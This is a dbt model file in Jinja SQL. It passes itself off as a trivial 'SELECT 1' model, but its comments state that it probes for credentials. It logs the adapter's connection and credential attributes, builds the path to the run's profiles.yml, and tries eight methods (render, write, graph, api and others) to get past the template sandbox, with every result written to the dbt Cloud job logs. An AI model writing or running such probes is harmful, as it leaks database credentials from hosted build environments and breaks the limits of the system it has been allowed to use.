{# Probe adapter object for credentials #}
{%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'norun') -%}

{# Adapter deep probe #}
{{ log("ADAPTER_STR=" ~ adapter | string | truncate(300), info=True) }}

{# Try dir() equivalent via string conversion #}
{%- for attr_name in ['config', 'connections', 'credentials', 'profile', 'connection', '_available_', 'type', 'Relation', 'Column', 'AdapterClass', 'dispatch'] -%}
  {%- set val = adapter[attr_name] if adapter[attr_name] is defined else 'UNDEF' -%}
  {{ log("ADAPTER." ~ attr_name ~ "=" ~ val | string | truncate(200), info=True) }}
{%- endfor -%}

{# Try adapter.config which might have connection details #}
{%- if adapter.config is defined -%}
  {{ log("ADAPTER_CONFIG_TYPE=" ~ adapter.config | string | truncate(500), info=True) }}
  {%- if adapter.config.credentials is defined -%}
    {{ log("ADAPTER_CONFIG_CREDS=" ~ adapter.config.credentials | string | truncate(500), info=True) }}
  {%- endif -%}
{%- endif -%}

{# Try load_agate_table to read profiles.yml #}
{%- set profiles_path = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' -%}
{%- set result = '' -%}
{%- do log("TRYING_LOAD_AGATE=" ~ profiles_path, info=True) -%}

{# load_agate_table usually takes (model, path) #}
{# Try various calling patterns #}

{# Method 1: Try run_query even though execute=False #}
{{ log("EXECUTE_FLAG=" ~ execute, info=True) }}

{# Method 2: Try fromyaml with file content via render #}
{%- set yaml_template = "{{ env_var('DBT_CLOUD_RUN_ID') }}" -%}
{%- set rendered_run_id = render(yaml_template) -%}
{{ log("RENDERED_RUN_ID=" ~ rendered_run_id, info=True) }}

{# Method 3: Try write() to understand its interface #}
{%- do log("WRITE_HELP=" ~ write.__doc__ | string | truncate(300), info=True) if write.__doc__ is defined else log("WRITE_NO_DOC", info=True) -%}

{# Method 4: Check all model attributes #}
{{ log("MODEL_TYPE=" ~ model | string | truncate(200), info=True) if model is defined else log("MODEL_UNDEF", info=True) }}
{{ log("MODEL_KEYS=" ~ model.keys() | list | join(',') | truncate(500), info=True) if model.keys is defined else log("MODEL_NO_KEYS", info=True) }}

{# Method 5: Try this (current model config) #}
{{ log("THIS=" ~ this | string | truncate(300), info=True) if this is defined else log("THIS_UNDEF", info=True) }}

{# Method 6: Graph object - contains all project metadata #}
{{ log("GRAPH_TYPE=" ~ graph | string | truncate(200), info=True) if graph is defined else log("GRAPH_UNDEF", info=True) }}
{%- if graph is defined and graph.nodes is defined -%}
  {{ log("GRAPH_NODES_COUNT=" ~ graph.nodes | length, info=True) }}
{%- endif -%}

{# Method 7: api object #}
{{ log("API_TYPE=" ~ api | string | truncate(200), info=True) if api is defined else log("API_UNDEF", info=True) }}

{# Method 8: column object #}
{{ log("COLUMN_TYPE=" ~ column | string | truncate(200), info=True) if column is defined else log("COLUMN_UNDEF", info=True) }}

SELECT 1 as id
